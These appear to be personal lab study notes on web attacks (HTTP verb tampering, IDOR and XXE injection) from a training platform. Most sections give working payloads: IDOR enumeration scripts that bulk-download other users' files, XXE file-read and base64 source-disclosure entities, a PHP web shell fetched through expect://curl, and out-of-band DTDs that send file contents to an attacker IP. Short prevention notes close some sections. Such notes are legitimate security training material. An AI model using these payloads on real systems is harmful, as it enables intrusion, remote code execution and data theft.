---
title: payloads
---

# web attacks

- HTTP Verb Tampering
    - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering
    - Types of verbs
        - GET	    The GET method requests a representation of the specified resource. Requests using GET should only retrieve data and should not contain a request content.
        - HEAD	    The HEAD method asks for a response identical to a GET request, but without a response body.
        - POST	    The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server.
        - PUT	    The PUT method replaces all current representations of the target resource with the request content.
        - DELETE	The DELETE method deletes the specified resource.
        - CONNECT 	The CONNECT method establishes a tunnel to the server identified by the target resource.
        - OPTIONS	The OPTIONS method describes the communication options for the target resource.
        - TRACE 	The TRACE method performs a message loop-back test along the path to the target resource.
        - PATCH 	The PATCH method applies partial modifications to a resource.
    - caused by 
        - insecure configurations
            - A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication
                - use a different HTTP method (like HEAD) to bypass this authentication mechanism altogether 
                ```xml
                <Limit GET POST>
                Require valid-user
                </Limit>
                ```
        - insecure coding
            - not using request GET or request POST could allow a threat actor to bypass by using HEAD
            - 
            ```php
            $pattern = "/^[A-Za-z\s]+$/";
            if(preg_match($pattern, $_GET["code"])) {
                $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
                ...SNIP...
            }
            ```
    - bypassing basic auth
        - standard file upload page that allows you to upload anything
        - contains a link to delete all the files - `http://SERVER_IP:PORT/admin/reset.php` but is protected by basic authentication
        - send the reset page to burp and see it is sending a GET request
        - change the request method to POST, still blocked?
        - try sending OPTIONS request `curl -i -X OPTIONS http://SERVER_IP:PORT/` to see what verbs are allowed
        - change the request method to HEAD, still blocked or have the files been deleted?
    - Bypassing Security Filters
        - security filters that check for injection vulnerabilites sometimes only check for injections in POSTs
        - www allows users to create a file
        - try to create a new file called `file1; touch file2;` with the semicolon to see if we can chain commands
        - if blocked, send through burp and change the request method ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/web-attacks/image.png)
- Insecure Direct Object References (IDOR)
    - an IDOR vulnerability mainly exists due to the lack of an access control on the back-end
    - The most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as IDOR Information Disclosure Vulnerabilities
    - web applications store users' files and information, they may use sequential numbers or user IDs to identify each item
    - exposes direct references to files and resources
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
    - look for Direct Object References
        - `?uid=1` or `?filename=file_1.pdf`
        - can be in cookies as well as urls
        -  ajax calls
            -  
            ```js

            function changeUserPassword() {
                $.ajax({
                    url:"change_password.php",
                    type: "post",
                    dataType: "json",
                    data: {uid: user.uid, password: user.password, is_admin: is_admin},
                    success:function(result){
                        //
                    }
                });
            }

            ```
        - filenames or numbers may be hashed or encoded
            - base64 `?filename=ZmlsZV8xMjMucGRm`
            - ajax call is using md5 hashing `download.php?filename=c81e728d9d4c2f636f067f89cc14862c`
            ```js
            $.ajax({
                url:"download.php",
                type: "post",
                dataType: "json",
                data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
                success:function(result){
                    //
                }
            });            
            ```
        - for more advanced idor attacks get two user accounts
            - is userA able to ajax the same commands as userB
        -   
- IDOR enumeration
    -  Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.
    -  insecure parameters
        -  static file IDOR
            -  example url `http://SERVER_IP:PORT/documents.php?uid=1`
            -  lists documents looking like below
            ```
                /documents/Invoice_1_09_2021.pdf
                /documents/Report_1_10_2021.pdf
            ```
            - looking for patterns we can see the files have a predictable naming pattern, as the file names appear to be using the user uid and the month/year as part of the file name, which may allow us to fuzz files for other users
            - try switcing uid values
                - `http://SERVER_IP:PORT/documents.php?uid=2`
                - lists documents looking like below
                ```
                /documents/Invoice_2_08_2020.pdf
                /documents/Report_2_12_2020.pdf
                ```
                - find the links via bash `curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"`
                - filter `curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`
                - create a bash script to itereate and wget the documents
                    - inline `for i in {1..20}; do curl 'http://94.237.61.242:54335/documents.php' -X POST --data-raw "uid=$i" -s | grep -oP "\/documents.*?.(pdf|txt)"; done;`
                    - script
                ```bash
                #!/bin/bash
                url="http://94.237.61.242:30360"
                #!/bin/bash
                for i in {1..20}; do
                    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
                    do
                        echo $url$link
                        wget -q $url$link
                    done
                done

                ```
    - bypassing encoded references
        - request is passing through a `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b` parameter like this instead of a plain text uid
        - try hashing values like uid, username, filename and see if it matches 
            - md5
            - sha256
            - `echo -n 1 | md5sum`
        - if the hash is difficult to predict it may be a secure direct object reference
        - client side generation of hash
            - check for functions in the source code eg
            ```js
            function downloadContract(uid) {
                $.redirect("/download.php", {
                    contract: CryptoJS.MD5(btoa(uid)).toString(),
                }, "POST", "_self");
            }

            ```
            - (btoa)[https://developer.mozilla.org/en-US/docs/Web/API/Window/btoa] creates a base64 encoded ascii string
            - then it is md5 hashed
            - `echo -n 1 | base64 -w 0 | md5sum`
            - example function
            ```sh
            #!/bin/bash
            for i in {1..10}; do
                for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
                    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
                done
            done
            ```
            - base64 encoded then url encoded
            ```sh
            #!/bin/bash
            for i in {1..20}; do
                for hash in $(echo -n $i | base64 -w 0 | jq "@uri" -jRr); do
                    curl -sOJ http://94.237.121.185:48859/download.php?contract=$hash
                done
            done
            ```
    - IDOR in Insecure APIs
        - check for api calls in burp
        -  PUT is used to update item details 
        -  POST is used to create new items 
        -  DELETE to delete items 
        -  GET to retrieve item details
        -  json payload
        ```json
        {
            "uid": 1,
            "uuid": "40f5888b67c748df7efba008e7c2f9d2",
            "role": "employee",
            "full_name": "Amy Lindon",
            "email": "a_lindon@employees.htb",
            "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
        }
        ```
            - role is passed through, can we make it admin
            - can we change the uid to another users uid to take over their account
            - change details
            - create new users
            - change the request method to try deleting
        - check if id is also in the url
    - Chaining IDOR Vulnerabilities
        - GET the users uuid by performing a get request first
            - then modify by sending a PUT
        - you could use this to change the users email address and then perform a password reset
        - or drop a xss payload into the "about" field and wait for the user to log in
        - find the admin role by enumerating through all the users
            - then modify a standard users permissions to web_admin
    - IDOR prevention
        - focus on Object-Level Access Control
        - User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.
        - Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting
        - should never use object references in clear text or simple patterns (e.g. uid=1)
        - always use strong and unique references, like salted hashes or UUID's
        - we should never calculate hashes on the front-end
- XML External Entity (XXE) Injection
    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    - utilizes outdated XML libraries to parse and process XML input data from the front-end user
    - occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions
    - Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements.
        - example
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <email>
        <date>01-01-2022</date>
        <time>10:00 am UTC</time>
        <sender>john@inlanefreight.com</sender>
        <recipients>
            <to>HR@inlanefreight.com</to>
            <cc>
                <to>billing@inlanefreight.com</to>
                <to>payslips@inlanefreight.com</to>
            </cc>
        </recipients>
        <body>
        Hello,
            Kindly share with me the invoice for the payment made on January 1, 2022.
        Regards,
        John
        </body> 
        </email>
        ```
    - XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
        - example
        ```xml
        <!DOCTYPE email [
        <!ELEMENT email (date, time, sender, recipients, body)>
        <!ELEMENT recipients (to, cc?)>
        <!ELEMENT cc (to*)>
        <!ELEMENT date (#PCDATA)>
        <!ELEMENT time (#PCDATA)>
        <!ELEMENT sender (#PCDATA)>
        <!ELEMENT to  (#PCDATA)>
        <!ELEMENT body (#PCDATA)>
        ]>
        ```
        - As we can see, the DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).
        - can be included directly in the xml declaration `<?xml version="1.0" encoding="UTF-8"?>`
            - `<!DOCTYPE email SYSTEM "email.dtd">`
            - `<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">`
    - XML Entities
        - define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value. It can then be used using `&companyname;`
            - example
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE company [
            <!ENTITY companyname "mycompany">
            ]>
            <company>
            <name>&companyname;</name>
            <message>Welcome to &companyname; — your trusted partner.</message>
            </company>
            ```
            - Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path
            -  example
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE email [
            <!ENTITY company SYSTEM "http://localhost/company.txt">
            <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
            ]>
            ```
    - file disclosure
        - we may be able to reference an external XML DTD document and define new custom XML entities
        - we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server
        - can we inject xml code?
        - example contact form that generates an xml file for posting to the server
            - ![alt text](../../../../media/web-attacks/{275F1AAD-7442-4666-8E31-C6D3F7A7B5F3}.png)
            - by posting we see the response is `check your email email@xxe.htb for further instructions`
                - we can see the email element gets displayed in the response
            - lets add a xml entity and see if we can reference it
                - ![alt text](../../../../media/web-attacks/web_attacks_xxe_new_entity.jpg)
            - the response did use the value of the entity we defined (Inlane Freight) instead of displaying &company;, indicating that we may inject XML code
            - a non-vulnerable web application would display (&company;) as a raw value
            - Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
        - read sensitive files
            - define external xml entities using the `SYSTEM` keyword
                ```xml
                <!DOCTYPE email [
                <!ENTITY company SYSTEM "file:///etc/passwd">
                ]>
                ```
            - This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server
        - read source code
            - example
            ```xml
            <!DOCTYPE email [
            <!ENTITY company SYSTEM "file://index.php">
            ]>

            ```
            - wont work because the file is not in proper xml format so it fails to be referenced as an external XML entity
            - if using php we can use php filters to convert it to base64
            ```xml
            <!DOCTYPE email [
            <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
            ]>
            ```
        - Remote Code Execution with XXE
            - create web shell `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`
            - start local server `sudo python3 -m http.server 80`
            - use expect to fire curl
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE email [
            <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.10.1/shell.php'">
            ]>
            <root>
            <name></name>
            <tel></tel>
            <email>&company;</email>
            <message></message>
            </root>
            ```
                - Note: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.
            -  `$IFS` = Internal Field Separator has default value of space, tab, and new line
            -  confirmed working version
        ```xml
        POST /submitDetails.php HTTP/1.1
        Host: 10.129.164.30
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Referer: http://10.129.164.30/
        Content-Type: text/plain;charset=UTF-8
        Content-Length: 244
        Origin: http://10.129.164.30
        DNT: 1
        Connection: keep-alive
        Sec-GPC: 1
        Priority: u=0

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [
        <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
        ]>
        <root>
        <name>a</name>
        <tel>d</tel>
        <email>
        &company;
        </email>
        <message>e</message>
        </root>

        ```
    - advanced methods
        - Advanced Exfiltration with CDATA
            - To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
            - Internal entities are defined directly in the DTD with their value included.
                - `<!ENTITY begin "<![CDATA[">`
            - External entities are defined using SYSTEM (or PUBLIC) and pull their content from an external resource (file, URL, etc.).
                - `<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">`
            - XML prevents joining internal and external entities so we cannot do the below
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE email [
            <!ENTITY begin "<![CDATA[">             
            <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
            <!ENTITY end "]]>">
            <!ENTITY joined "&begin;&file;&end;">   <!--DOES NOT WORK>
            ]>
            ```
            - XML Parameter Entities are a special type of entity that starts with a % character and can only be used within the DTD. If we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined. 
                - generate dtd `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`
                - host on kali `python3 -m http.server 8000`
                - payload
                ```xml
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE email [
                <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
                <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
                <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
                <!ENTITY % xxe SYSTEM "http://10.10.14.146:8000/xxe.dtd"> <!-- reference our external DTD -->
                %xxe;
                ]>
                <root>
                <name>a</name>
                <tel>4444</tel>
                <email>&joined;</email>
                <message>test</message>
                </root>
                ```
        - Error Based XXE
            - If the web application is displaying full stack traces or error dumps we can send malformed xml data 
                - `<nam>a</nam>` forge the e in the name field
                - reference a non existing entity 
                    `<name>&nonExistingEntity;</name>`
            - generate external dtd script
                - 
                ```bash
                echo '
                <!ENTITY % file SYSTEM "file:///etc/hosts">
                <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' > xxe.dtd
                ```
                - defines the file parameter entity 
                - then joins it with an entity that does not exist `%nonExistingEntity;`
                - the web application will throw an error saying that this entity does not exist, along with our joined %file; as part of the error
            - host on kali `python3 -m http.server 8000`
            - payload
            ```xml
            <!DOCTYPE email [
            <!ENTITY % remote SYSTEM "http://10.10.14.16:8000/xxe.dtd">
            %remote;
            %error;
            ]>
            ```
    - Blind Data Exfiltration
        - nothing printed on the web application response so we cant determine if it was successful
        - Out-of-band (OOB) Data Exfiltration, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE
        - out of band attack means the attack is connecting back to us
        - Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
        - create `xxe.dtd`
        ```
            <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
            <!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.89:8000/?content=%file;'>">
        ```
        - index.php 
            ```php
            <?php
            if(isset($_GET['content'])){
                error_log("\n\n" . base64_decode($_GET['content']));
            }
            ?>
            ```
        - host php file `php -S 0.0.0.0:8000`
        - payload
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [ 
        <!ENTITY % remote SYSTEM "http://10.10.14.89:8000/xxe.dtd">
        %remote;
        %oob;
        ]>
        <root>&content;</root>
        ```
        - automated
            - `git clone https://github.com/enjoiz/XXEinjector.git`
            - was unable to get this to work
    - XXE Prevention
        - Avoiding Outdated Components aka patch your shit
        - Using Safe XML Configurations
            - Disable referencing custom Document Type Definitions (DTDs)
            - Disable referencing External XML Entities
            - Disable Parameter Entity processing
            - Disable support for XInclude
            - Prevent Entity Reference Loops
        - always disable displaying runtime errors in web servers




        
    